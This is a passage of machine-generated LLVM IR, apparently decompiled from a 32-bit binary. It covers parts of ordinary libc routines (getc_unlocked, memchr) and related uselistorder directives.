  %v5_8054959 = mul nuw i64 %v4_8054959, 4294967296
  %v6_8054959 = or i64 %v5_8054959, %v2_8054959
  %v8_8054959 = sdiv i64 %v6_8054959, 10
  %v9_8054959 = trunc i64 %v8_8054959 to i32
  store i32 %v9_8054959, i32* %eax.global-to-local, align 4
  %v11_8054959 = srem i64 %v6_8054959, 10
  %v12_8054959 = trunc i64 %v11_8054959 to i8
  %v1_805495b = add i32 %v0_805495b, -1
  store i32 %v1_805495b, i32* %ebx.global-to-local, align 4
  %v1_805495c = add i8 %v12_8054959, 48
  %v1_805495f = add i32 %v0_805495f, 1
  store i32 %v1_805495f, i32* %esi.global-to-local, align 4
  %v3_8054960 = inttoptr i32 %v1_805495b to i8*
  store i8 %v1_805495c, i8* %v3_8054960, align 1
  %v0_8054962 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8054959, i32* %edx.global-to-local, align 4
  %v7_8054967 = icmp sgt i32 %v0_8054962, 3
  br i1 %v7_8054967, label %dec_label_pc_8054969, label %dec_label_pc_8054951.backedge

dec_label_pc_8054969:                             ; preds = %dec_label_pc_8054951
  %v2_8054969 = icmp eq i32 %v9_8054959, 0
  %v1_805496b = icmp eq i1 %v2_8054969, false
  br i1 %v1_805496b, label %dec_label_pc_8054951.backedge, label %dec_label_pc_805496d

dec_label_pc_8054951.backedge:                    ; preds = %dec_label_pc_8054969, %dec_label_pc_8054951
  %v0_805495b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054951

dec_label_pc_805496d:                             ; preds = %dec_label_pc_8054969
  %v0_805496d = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805496d, i32* %edx.global-to-local, align 4
  %v0_805496f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805496f = add i32 %v0_805496f, -2
  store i32 %v1_805496f, i32* %eax.global-to-local, align 4
  %v1_8054972 = trunc i32 %v0_805496d to i8
  %v3_8054972 = add i32 %v0_805496f, -1
  %v4_8054972 = inttoptr i32 %v3_8054972 to i8*
  store i8 %v1_8054972, i8* %v4_8054972, align 1
  %v5_8054975 = load i32, i32* %edx.global-to-local, align 4
  %v6_8054975 = and i32 %v5_8054975, -256
  %v7_8054975 = or i32 %v6_8054975, %stack_var_-42.0
  store i32 %v7_8054975, i32* %edx.global-to-local, align 4
  %v2_8054979 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8054979 = add i32 %v2_8054979, -2
  %v4_8054979 = inttoptr i32 %v3_8054979 to i8*
  store i8 %v1_8054925, i8* %v4_8054979, align 1
  %v0_805497c = load i32, i32* @ecx, align 4
  %v1_805497c = inttoptr i32 %v0_805497c to i32*
  store i32 112, i32* %v1_805497c, align 4
  %v0_8054982 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054982 = load i32, i32* @ecx, align 4
  %v2_8054982 = add i32 %v1_8054982, 4
  %v3_8054982 = inttoptr i32 %v2_8054982 to i32*
  store i32 %v0_8054982, i32* %v3_8054982, align 4
  %v0_8054985 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054985 = load i32, i32* @ecx, align 4
  %v2_8054985 = add i32 %v1_8054985, 8
  %v3_8054985 = inttoptr i32 %v2_8054985 to i32*
  store i32 %v0_8054985, i32* %v3_8054985, align 4
  %v0_8054988 = load i32, i32* @ecx, align 4
  %v1_8054988 = add i32 %v0_8054988, 12
  store i32 %v1_8054988, i32* @ecx, align 4
  br label %dec_label_pc_805498b

dec_label_pc_805498b:                             ; preds = %dec_label_pc_8054915, %dec_label_pc_80545b0, %dec_label_pc_805496d
  %v0_8054a0c = phi i32 [ %v1_805499884, %dec_label_pc_8054915 ], [ %v2_80545b8, %dec_label_pc_80545b0 ], [ %v1_8054988, %dec_label_pc_805496d ]
  %v2_805498b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805498b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805498f

dec_label_pc_805498f:                             ; preds = %dec_label_pc_805498f, %dec_label_pc_805498b
  %v0_805498f = phi i32 [ %v2_805498b, %dec_label_pc_805498b ], [ %v1_8054991, %dec_label_pc_805498f ]
  %stack_var_-216.0 = phi i32 [ %v3_80544a3, %dec_label_pc_805498b ], [ %v5_8054994, %dec_label_pc_805498f ]
  %v1_805498f = inttoptr i32 %v0_805498f to i32*
  %v2_805498f = load i32, i32* %v1_805498f, align 4
  store i32 %v2_805498f, i32* %edx.global-to-local, align 4
  %v1_8054991 = add i32 %v0_805498f, 12
  store i32 %v1_8054991, i32* %eax.global-to-local, align 4
  %v5_8054994 = sub i32 %stack_var_-216.0, %v2_805498f
  %v7_8054998 = icmp ult i32 %v1_8054991, %v0_8054a0c
  br i1 %v7_8054998, label %dec_label_pc_805498f, label %dec_label_pc_805499c

dec_label_pc_805499c:                             ; preds = %dec_label_pc_805498f
  %v5_80549a5 = icmp eq i8 %stack_var_-26.0, 0
  %v1_80549b5 = icmp eq i1 %v5_80549a5, false
  %v2_80549b5 = zext i1 %v1_80549b5 to i32
  %v2_80549b8 = sub i32 %v5_8054994, %v2_80549b5
  store i32 %v2_80549b8, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_80549b8, i32* %eax.global-to-local, align 4
  store i32 %v0_8054a0c, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_80549b8, 1
  br i1 %tmp141, label %dec_label_pc_8054a0e, label %dec_label_pc_80549ce

dec_label_pc_80549ce:                             ; preds = %dec_label_pc_805499c
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_80549d5 = inttoptr i32 %v1_80544e3 to i8*
  %v3_80549d5 = load i8, i8* %v2_80549d5, align 1
  %v4_80549d5 = and i8 %v3_80549d5, 8
  %v5_80549d5 = icmp eq i8 %v4_80549d5, 0
  br i1 %v5_80549d5, label %dec_label_pc_80549f0, label %dec_label_pc_80549db

dec_label_pc_80549db:                             ; preds = %dec_label_pc_80549ce
  %v1_80549db = add i32 %v0_8054a0c, 12
  store i32 %v1_80549db, i32* %esi.global-to-local, align 4
  %v1_80549de = inttoptr i32 %v0_8054a0c to i32*
  store i32 160, i32* %v1_80549de, align 4
  %v0_80549e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80549e4 = load i32, i32* @ecx, align 4
  %v2_80549e4 = add i32 %v1_80549e4, 4
  %v3_80549e4 = inttoptr i32 %v2_80549e4 to i32*
  store i32 %v0_80549e4, i32* %v3_80549e4, align 4
  %v0_80549e7 = load i32, i32* @ecx, align 4
  %v1_80549e7 = add i32 %v0_80549e7, 8
  %v2_80549e7 = inttoptr i32 %v1_80549e7 to i32*
  store i32 ptrtoint (i32* @global_var_8060e73.785 to i32), i32* %v2_80549e7, align 4
  br label %dec_label_pc_8054a0e

dec_label_pc_80549f0:                             ; preds = %dec_label_pc_80549ce
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80549f7 = add i32 %tmp112, 16
  %v2_80549f7 = inttoptr i32 %v1_80549f7 to i32*
  %v3_80549f7 = load i32, i32* %v2_80549f7, align 4
  %v9_80549f7 = icmp eq i32 %v3_80549f7, 48
  %v1_80549fb = icmp eq i1 %v9_80549f7, false
  br i1 %v1_80549fb, label %dec_label_pc_8054a08, label %dec_label_pc_80549fd

dec_label_pc_80549fd:                             ; preds = %dec_label_pc_80549f0
  %v3_80549fd = load i32, i32* %stack_var_-152, align 4
  %v5_80549fd = add i32 %v3_80549fd, %v2_80549b8
  store i32 %v5_80549fd, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8054a0c

dec_label_pc_8054a03:                             ; preds = %dec_label_pc_8054a14
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054a3b

dec_label_pc_8054a08:                             ; preds = %dec_label_pc_80549f0
  br label %dec_label_pc_8054a0c

dec_label_pc_8054a0c:                             ; preds = %dec_label_pc_80549fd, %dec_label_pc_8054a08
  store i32 %v0_8054a0c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054a0e

dec_label_pc_8054a0e:                             ; preds = %dec_label_pc_805499c, %dec_label_pc_80549db, %dec_label_pc_8054a0c
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8054a10 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8054a10, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054a14

dec_label_pc_8054a14:                             ; preds = %dec_label_pc_8054a32, %dec_label_pc_8054a0e
  call void @__pseudo_call(i32 %tmp112)
  %v0_8054a2d = load i32, i32* %eax.global-to-local, align 4
  %v1_8054a2d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054a2d = add i32 %v1_8054a2d, 4
  %v3_8054a2d = inttoptr i32 %v2_8054a2d to i32*
  %v4_8054a2d = load i32, i32* %v3_8054a2d, align 4
  %v15_8054a2d = icmp eq i32 %v0_8054a2d, %v4_8054a2d
  %v1_8054a30 = icmp eq i1 %v15_8054a2d, false
  br i1 %v1_8054a30, label %dec_label_pc_8054a03, label %dec_label_pc_8054a32

dec_label_pc_8054a32:                             ; preds = %dec_label_pc_8054a14
  %v1_8054a32 = add i32 %v1_8054a2d, 12
  store i32 %v1_8054a32, i32* %ebx.global-to-local, align 4
  %v0_8054a35 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054a35 = add i32 %v0_8054a35, %v0_8054a2d
  store i32 %v2_8054a35, i32* %edi.global-to-local, align 4
  %v1_8054a37 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054a37 = icmp ult i32 %v1_8054a32, %v1_8054a37
  br i1 %v7_8054a37, label %dec_label_pc_8054a14, label %dec_label_pc_8054a3b

dec_label_pc_8054a3b:                             ; preds = %dec_label_pc_8054a32, %dec_label_pc_8054a03
  %v0_8054a41 = phi i32 [ -1, %dec_label_pc_8054a03 ], [ %v2_8054a35, %dec_label_pc_8054a32 ]
  store i32 %v0_8054a41, i32* %eax.global-to-local, align 4
  %v2_8054a44 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054a44, i32* @esi, align 4
  store i32 %v0_8054486, i32* @edi, align 4
  store i32 %v0_8054485, i32* @ebp, align 4
  ret i32 %v0_8054a41

; uselistorder directives
  uselistorder i32 %v0_8054a41, { 1, 0 }
  uselistorder i32 %v1_8054991, { 1, 2, 0 }
  uselistorder i32 %v0_805498f, { 1, 0 }
  uselistorder i32 %v0_8054a0c, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8054962, { 1, 0 }
  uselistorder i32 %v9_8054959, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8054951, { 1, 0 }
  uselistorder i32 %v0_8054923, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80548fc, { 1, 0 }
  uselistorder i32 %v1_80548fc, { 1, 0, 2 }
  uselistorder i32 %v2_80548fa, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8054830, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8054816, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805487b, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_80547e1, { 0, 2, 1 }
  uselistorder i32 %v1_80547ba, { 1, 0 }
  uselistorder i32 %v0_80547b5, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8054782, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_805477d, { 1, 0 }
  uselistorder i8 %v2_8054776, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8054776, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8054700, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_80546e5, { 1, 0 }
  uselistorder i32 %v1_80546d1, { 1, 0 }
  uselistorder i32 %v0_80546c5, { 1, 0 }
  uselistorder i32 %v4_80546ac, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_80546b1, { 1, 0 }
  uselistorder i32 %v2_805466f, { 1, 0, 2 }
  uselistorder i3 %v1_8054525, { 1, 0 }
  uselistorder i8 %v4_80545a4, { 1, 0 }
  uselistorder i32 %v3_80544e3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_80544e3, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_80544b5, { 1, 0 }
  uselistorder i32 %v3_80544a3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st1.global-to-local, { 1, 0, 2 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 10, 9, 11, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 23, 10, 11, 24, 13, 14, 12, 18, 15, 16, 17, 19, 20, 21, 22 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 7, 8, 3, 9, 6, 4, 10, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054a0e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a0c, { 1, 0 }
  uselistorder label %dec_label_pc_805498b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805493d, { 1, 0 }
  uselistorder label %dec_label_pc_8054915, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80548e4, { 1, 0 }
  uselistorder label %dec_label_pc_80548d1, { 1, 0 }
  uselistorder label %dec_label_pc_80548b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054884, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805486f, { 1, 0 }
  uselistorder label %dec_label_pc_8054864, { 1, 0 }
  uselistorder label %dec_label_pc_80547eb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80547dd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80547a3, { 1, 0 }
  uselistorder label %dec_label_pc_8054773.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_805473f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805470e, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80546f9, { 1, 0 }
  uselistorder label %dec_label_pc_80545b0, { 1, 0 }
  uselistorder label %dec_label_pc_80544d4, { 1, 0 }
  uselistorder label %dec_label_pc_80544cb, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8054a48 = load i32, i32* @ebx, align 4
  %v4_8054a4c = ptrtoint i16* %tmp to i32
  store i32 %v4_8054a4c, i32* @ebx, align 4
  %v1_8054a50 = add i32 %v4_8054a4c, 16
  %v2_8054a50 = inttoptr i32 %v1_8054a50 to i32*
  %v3_8054a50 = load i32, i32* %v2_8054a50, align 4
  %v2_8054a53 = add i32 %v4_8054a4c, 24
  %v3_8054a53 = inttoptr i32 %v2_8054a53 to i32*
  %v4_8054a53 = load i32, i32* %v3_8054a53, align 4
  %v10_8054a53 = icmp ult i32 %v3_8054a50, %v4_8054a53
  br i1 %v10_8054a53, label %dec_label_pc_8054af5, label %dec_label_pc_8054a5c

dec_label_pc_8054a5c:                             ; preds = %entry
  %v2_8054a5c = load i16, i16* %tmp, align 2
  %v3_8054a5c = zext i16 %v2_8054a5c to i32
  %v1_8054a5f = and i32 %v3_8054a5c, 131
  %v6_8054a69 = icmp ugt i32 %v1_8054a5f, 128
  br i1 %v6_8054a69, label %dec_label_pc_8054a83, label %dec_label_pc_8054a6b

dec_label_pc_8054a6b:                             ; preds = %dec_label_pc_8054a5c
  %v0_8054a6b = load i32, i32* @edx, align 4
  %v6_8054a73 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8054a6b, i32 %v0_8054a6b)
  %v1_8054a7b = icmp eq i32 %v6_8054a73, 0
  %v1_8054a7d = icmp eq i1 %v1_8054a7b, false
  br i1 %v1_8054a7d, label %dec_label_pc_8054b1a, label %dec_label_pc_8054a6b.dec_label_pc_8054a83_crit_edge

dec_label_pc_8054a6b.dec_label_pc_8054a83_crit_edge: ; preds = %dec_label_pc_8054a6b
  %v0_8054a83.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054a83

dec_label_pc_8054a83:                             ; preds = %dec_label_pc_8054a6b.dec_label_pc_8054a83_crit_edge, %dec_label_pc_8054a5c
  %v2_8054ab7 = phi i32 [ %v0_8054a83.pre, %dec_label_pc_8054a6b.dec_label_pc_8054a83_crit_edge ], [ %v4_8054a4c, %dec_label_pc_8054a5c ]
  %v1_8054a83 = inttoptr i32 %v2_8054ab7 to i32*
  %v2_8054a83 = load i32, i32* %v1_8054a83, align 4
  store i32 %v2_8054a83, i32* @ecx, align 4
  %v1_8054a85 = urem i32 %v2_8054a83, 65536
  store i32 %v1_8054a85, i32* %edx.global-to-local, align 4
  %v2_8054a88 = and i32 %v2_8054a83, 2
  %v3_8054a88 = icmp eq i32 %v2_8054a88, 0
  br i1 %v3_8054a88, label %dec_label_pc_8054aa6, label %dec_label_pc_8054a8d

dec_label_pc_8054a8d:                             ; preds = %dec_label_pc_8054a83
  %v1_8054a8d = urem i32 %v2_8054a83, 2
  store i32 %v1_8054a8d, i32* %edx.global-to-local, align 4
  %v1_8054a90 = add i32 %v2_8054a83, 65535
  %v1_8054a93 = trunc i32 %v1_8054a90 to i16
  %v3_8054a93 = inttoptr i32 %v2_8054ab7 to i16*
  store i16 %v1_8054a93, i16* %v3_8054a93, align 2
  %v0_8054a96 = load i32, i32* @ebx, align 4
  %v1_8054a96 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054a96 = mul i32 %v1_8054a96, 4
  %v3_8054a96 = add i32 %v0_8054a96, 36
  %v4_8054a96 = add i32 %v3_8054a96, %v2_8054a96
  %v5_8054a96 = inttoptr i32 %v4_8054a96 to i8*
  %v6_8054a96 = load i8, i8* %v5_8054a96, align 1
  %v7_8054a96 = zext i8 %v6_8054a96 to i32
  %v9_8054a96 = and i32 %v1_8054a96, -256
  %v10_8054a96 = or i32 %v7_8054a96, %v9_8054a96
  store i32 %v10_8054a96, i32* %edx.global-to-local, align 4
  %v1_8054a9a = add i32 %v0_8054a96, 40
  %v2_8054a9a = inttoptr i32 %v1_8054a9a to i32*
  store i32 0, i32* %v2_8054a9a, align 4
  %v0_8054aa1 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054aa1 = urem i32 %v0_8054aa1, 256
  store i32 %v1_8054aa1, i32* @edx, align 4
  br label %dec_label_pc_8054b1d

dec_label_pc_8054aa6:                             ; preds = %dec_label_pc_8054a83
  %v1_8054aa6 = add i32 %v2_8054ab7, 16
  %v2_8054aa6 = inttoptr i32 %v1_8054aa6 to i32*
  %v3_8054aa6 = load i32, i32* %v2_8054aa6, align 4
  store i32 %v3_8054aa6, i32* @eax, align 4
  %v1_8054aa9 = add i32 %v2_8054ab7, 20
  %v2_8054aa9 = inttoptr i32 %v1_8054aa9 to i32*
  %v3_8054aa9 = load i32, i32* %v2_8054aa9, align 4
  %v15_8054aa9 = icmp eq i32 %v3_8054aa9, %v3_8054aa6
  %v1_8054aac = icmp eq i1 %v15_8054aa9, false
  br i1 %v1_8054aac, label %dec_label_pc_8054af5, label %dec_label_pc_8054aae

dec_label_pc_8054aae:                             ; preds = %dec_label_pc_8054aa6
  %v1_8054aae = add i32 %v2_8054ab7, 4
  %v2_8054aae = inttoptr i32 %v1_8054aae to i32*
  %v3_8054aae = load i32, i32* %v2_8054aae, align 4
  %v13_8054aae = icmp eq i32 %v3_8054aae, -2
  %v1_8054ab2 = icmp eq i1 %v13_8054aae, false
  br i1 %v1_8054ab2, label %dec_label_pc_8054abc, label %dec_label_pc_8054ab4

dec_label_pc_8054ab4:                             ; preds = %dec_label_pc_8054aae
  %v1_8054ab4 = or i32 %v2_8054a83, 4
  store i32 %v1_8054ab4, i32* @ecx, align 4
  %v1_8054ab7 = trunc i32 %v1_8054ab4 to i16
  %v3_8054ab7 = inttoptr i32 %v2_8054ab7 to i16*
  store i16 %v1_8054ab7, i16* %v3_8054ab7, align 2
  br label %dec_label_pc_8054b1a

dec_label_pc_8054abc:                             ; preds = %dec_label_pc_8054aae
  %v1_8054abc = udiv i32 %v2_8054a83, 256
  %v2_8054abc = trunc i32 %v1_8054abc to i8
  %v3_8054abc = urem i8 %v2_8054abc, 4
  %v4_8054abc = icmp eq i8 %v3_8054abc, 0
  %v8_8054abc = zext i8 %v3_8054abc to i32
  %v10_8054abc = mul nuw nsw i32 %v8_8054abc, 256
  %v11_8054abc = urem i32 %v2_8054a83, 256
  %v12_8054abc = or i32 %v10_8054abc, %v11_8054abc
  store i32 %v12_8054abc, i32* %edx.global-to-local, align 4
  br i1 %v4_8054abc, label %dec_label_pc_8054ad1, label %dec_label_pc_8054ac1

dec_label_pc_8054ac1:                             ; preds = %dec_label_pc_8054abc
  %v3_8054ac9 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_80612ec.706 to i16*))
  %v0_8054ad1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054ad1

dec_label_pc_8054ad1:                             ; preds = %dec_label_pc_8054abc, %dec_label_pc_8054ac1
  %v0_8054b06 = phi i32 [ %v2_8054ab7, %dec_label_pc_8054abc ], [ %v0_8054ad1.pre, %dec_label_pc_8054ac1 ]
  %v1_8054ad1 = add i32 %v0_8054b06, 8
  %v2_8054ad1 = inttoptr i32 %v1_8054ad1 to i32*
  %v3_8054ad1 = load i32, i32* %v2_8054ad1, align 4
  %v1_8054ad4 = add i32 %v0_8054b06, 12
  %v2_8054ad4 = inttoptr i32 %v1_8054ad4 to i32*
  %v3_8054ad4 = load i32, i32* %v2_8054ad4, align 4
  %v15_8054ad4 = icmp eq i32 %v3_8054ad4, %v3_8054ad1
  br i1 %v15_8054ad4, label %dec_label_pc_8054afe, label %dec_label_pc_8054ad9

dec_label_pc_8054ad9:                             ; preds = %dec_label_pc_8054ad1
  %v2_8054adc = add i32 %v0_8054b06, 24
  %v3_8054adc = inttoptr i32 %v2_8054adc to i32*
  store i32 %v3_8054ad1, i32* %v3_8054adc, align 4
  %v0_8054adf = load i32, i32* @ebx, align 4
  %v2_8054ae0 = call i32 @__stdio_rfill(i32 %v0_8054adf)
  %v1_8054ae8 = icmp eq i32 %v2_8054ae0, 0
  br i1 %v1_8054ae8, label %dec_label_pc_8054b1a, label %dec_label_pc_8054aec

dec_label_pc_8054aec:                             ; preds = %dec_label_pc_8054ad9
  %v0_8054aec = load i32, i32* @ebx, align 4
  %v1_8054aec = add i32 %v0_8054aec, 20
  %v2_8054aec = inttoptr i32 %v1_8054aec to i32*
  %v3_8054aec = load i32, i32* %v2_8054aec, align 4
  %v2_8054aef = add i32 %v0_8054aec, 24
  %v3_8054aef = inttoptr i32 %v2_8054aef to i32*
  store i32 %v3_8054aec, i32* %v3_8054aef, align 4
  %v0_8054af2 = load i32, i32* @ebx, align 4
  %v1_8054af2 = add i32 %v0_8054af2, 16
  %v2_8054af2 = inttoptr i32 %v1_8054af2 to i32*
  %v3_8054af2 = load i32, i32* %v2_8054af2, align 4
  br label %dec_label_pc_8054af5

dec_label_pc_8054af5:                             ; preds = %dec_label_pc_8054aa6, %entry, %dec_label_pc_8054aec
  %v1_8054af9 = phi i32 [ %v2_8054ab7, %dec_label_pc_8054aa6 ], [ %v4_8054a4c, %entry ], [ %v0_8054af2, %dec_label_pc_8054aec ]
  %v0_8054af5 = phi i32 [ %v3_8054aa6, %dec_label_pc_8054aa6 ], [ %v3_8054a50, %entry ], [ %v3_8054af2, %dec_label_pc_8054aec ]
  %v1_8054af5 = inttoptr i32 %v0_8054af5 to i8*
  %v2_8054af5 = load i8, i8* %v1_8054af5, align 1
  %v3_8054af5 = zext i8 %v2_8054af5 to i32
  store i32 %v3_8054af5, i32* @edx, align 4
  %v1_8054af8 = add i32 %v0_8054af5, 1
  %v2_8054af9 = add i32 %v1_8054af9, 16
  %v3_8054af9 = inttoptr i32 %v2_8054af9 to i32*
  store i32 %v1_8054af8, i32* %v3_8054af9, align 4
  %v0_8054b1d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054b1d

dec_label_pc_8054afe:                             ; preds = %dec_label_pc_8054ad1
  %v2_8054b01 = ptrtoint i8* %stack_var_-5 to i32
  %v5_8054b06 = inttoptr i32 %v0_8054b06 to i16*
  %v5_8054b07 = call i32 @__stdio_READ(i16* %v5_8054b06, i32 %v2_8054b01, i32 1)
  %v1_8054b0f = icmp eq i32 %v5_8054b07, 0
  br i1 %v1_8054b0f, label %dec_label_pc_8054b1a, label %dec_label_pc_8054b13

dec_label_pc_8054b13:                             ; preds = %dec_label_pc_8054afe
  %v3_8054b13 = load i8, i8* %stack_var_-5, align 1
  %v4_8054b13 = sext i8 %v3_8054b13 to i32
  store i32 %v4_8054b13, i32* @edx, align 4
  br label %dec_label_pc_8054b1d

dec_label_pc_8054b1a:                             ; preds = %dec_label_pc_8054afe, %dec_label_pc_8054ad9, %dec_label_pc_8054a6b, %dec_label_pc_8054ab4
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8054b1d

dec_label_pc_8054b1d:                             ; preds = %dec_label_pc_8054b13, %dec_label_pc_8054af5, %dec_label_pc_8054a8d, %dec_label_pc_8054b1a
  %v0_8054b1d = phi i32 [ %v4_8054b13, %dec_label_pc_8054b13 ], [ %v0_8054b1d.pre, %dec_label_pc_8054af5 ], [ %v1_8054aa1, %dec_label_pc_8054a8d ], [ -1, %dec_label_pc_8054b1a ]
  store i32 %v0_8054a48, i32* @ebx, align 4
  ret i32 %v0_8054b1d

; uselistorder directives
  uselistorder i32 %v0_8054af5, { 1, 0 }
  uselistorder i32 %v3_8054ad1, { 1, 0 }
  uselistorder i32 %v0_8054b06, { 0, 1, 3, 2 }
  uselistorder i8 %v3_8054abc, { 1, 0 }
  uselistorder i32 %v3_8054aa6, { 1, 0, 2 }
  uselistorder i32 %v1_8054aa1, { 1, 0 }
  uselistorder i32 %v2_8054a83, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_8054ab7, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8054b1d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8054b1a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8054af5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054ad1, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8054b24 = load i32, i32* @edi, align 4
  store i32 %v0_8054b24, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8054b2b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054b2b, i32* %edi.global-to-local, align 4
  %v1_8054b33 = icmp eq i32 %arg3, 0
  store i1 %v1_8054b33, i1* %zf.global-to-local, align 1
  br i1 %v1_8054b33, label %dec_label_pc_8054b43, label %dec_label_pc_8054b37

dec_label_pc_8054b37:                             ; preds = %entry
  %v2_8054b37 = call i32 @_strlen(i8* %arg1)
  %v3_8054b37 = mul i32 %v2_8054b37, -1
  %v4_8054b37 = add i32 %v3_8054b37, -2
  store i32 %v4_8054b37, i32* @ecx, align 4
  %v0_8054b39 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8054b39, label %dec_label_pc_8054b37.dec_label_pc_8054b40_crit_edge, label %dec_label_pc_8054b3b

dec_label_pc_8054b37.dec_label_pc_8054b40_crit_edge: ; preds = %dec_label_pc_8054b37
  %v0_8054b40.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8054b40.pre, -1
  br label %dec_label_pc_8054b40

dec_label_pc_8054b3b:                             ; preds = %dec_label_pc_8054b37
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054b40

